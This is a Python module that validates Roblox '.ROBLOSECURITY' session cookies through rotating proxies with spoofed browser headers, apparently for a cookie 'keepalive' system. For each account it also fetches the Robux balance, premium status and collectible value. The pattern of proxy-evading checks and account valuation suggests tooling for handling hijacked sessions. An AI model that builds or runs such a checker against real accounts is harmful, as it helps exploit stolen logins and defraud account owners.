"""
Direct Roblox cookie validation & stats refresh.
Used by the keepalive system to check cookies without the external roblox_api service.
"""
import logging
import requests
from typing import Optional

logger = logging.getLogger(__name__)

_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                  "(KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "en-US,en;q=0.9",
    "Origin": "https://www.roblox.com",
    "Referer": "https://www.roblox.com/",
}


def _do_check(cookie: str, proxies: Optional[dict], timeout: int = 12) -> Optional[dict]:
    """
    Raw check — returns identity dict, None on 401, raises on network error.
    """
    resp = requests.get(
        "https://users.roblox.com/v1/users/authenticated",
        cookies={".ROBLOSECURITY": cookie},
        headers=_HEADERS,
        proxies=proxies,
        timeout=timeout,
    )
    if resp.status_code == 401:
        return None
    if resp.status_code == 200:
        return resp.json()
    # 429 / 5xx / other — treat as unknown (don't kill cookie over rate limit)
    return {"id": 0, "name": "unknown", "displayName": "unknown"}


def is_cookie_valid(cookie: str, proxy: Optional[str] = None) -> Optional[dict]:
    """
    Check if cookie is still authorized.
    Returns user identity dict {id, name, displayName} on success, None if 401/invalid.
    On proxy failure — retries with another proxy from pool.
    """
    import proxy_utils

    # Build proxy list to try
    proxies_to_try = []
    if proxy:
        proxies_to_try.append(proxy)
    # Add 2 more random proxies as fallback
    for _ in range(2):
        p = proxy_utils.get_random_proxy_safe()
        if p and p not in proxies_to_try:
            proxies_to_try.append(p)

    for i, px in enumerate(proxies_to_try):
        try:
            return _do_check(cookie, {"http": px, "https": px})
        except requests.exceptions.ProxyError:
            logger.warning(f"is_cookie_valid: proxy {i+1}/{len(proxies_to_try)} failed, trying next...")
        except requests.exceptions.Timeout:
            logger.warning(f"is_cookie_valid: proxy {i+1}/{len(proxies_to_try)} timeout, trying next...")
        except requests.exceptions.ConnectionError:
            logger.warning(f"is_cookie_valid: proxy {i+1}/{len(proxies_to_try)} conn error, trying next...")
        except Exception as e:
            logger.warning(f"is_cookie_valid: proxy {i+1}/{len(proxies_to_try)} error {e.__class__.__name__}, trying next...")

    # All proxies failed — treat as unknown (don't kill the cookie)
    logger.error("is_cookie_valid: all proxies failed")
    return {"id": 0, "name": "proxy_fail", "displayName": "proxy_fail"}


def _request_with_fallback(method, url, cookie, proxy=None, **kwargs):
    """Make a request with proxy, retry with other proxies on failure."""
    import proxy_utils

    kwargs.setdefault("timeout", 10)
    kwargs.setdefault("headers", _HEADERS)
    kwargs["cookies"] = {".ROBLOSECURITY": cookie}

    proxies_to_try = []
    if proxy:
        proxies_to_try.append(proxy)
    for _ in range(2):
        p = proxy_utils.get_random_proxy_safe()
        if p and p not in proxies_to_try:
            proxies_to_try.append(p)

    for px in proxies_to_try:
        try:
            resp = method(url, proxies={"http": px, "https": px}, **kwargs)
            if resp.status_code == 200:
                return resp
        except Exception:
            continue

    return None


def fetch_robux(cookie: str, user_id: int, proxy: Optional[str] = None) -> Optional[int]:
    """Fetch current robux balance."""
    resp = _request_with_fallback(
        requests.get,
        f"https://economy.roblox.com/v1/users/{user_id}/currency",
        cookie, proxy,
    )
    if resp:
        try:
            return resp.json().get("robux", 0)
        except Exception:
            pass
    return None


def fetch_premium(cookie: str, user_id: int, proxy: Optional[str] = None) -> Optional[bool]:
    """Check premium status."""
    resp = _request_with_fallback(
        requests.get,
        f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership",
        cookie, proxy,
    )
    if resp:
        try:
            return resp.json() is True
        except Exception:
            pass
    return None


def fetch_rap(cookie: str, user_id: int, proxy: Optional[str] = None) -> Optional[int]:
    """Fetch Recent Average Price of collectibles."""
    resp = _request_with_fallback(
        requests.get,
        f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles"
        f"?sortOrder=Asc&limit=100",
        cookie, proxy,
    )
    if resp:
        try:
            items = resp.json().get("data", [])
            return sum((item.get("recentAveragePrice") or 0) for item in items)
        except Exception:
            pass
    return None
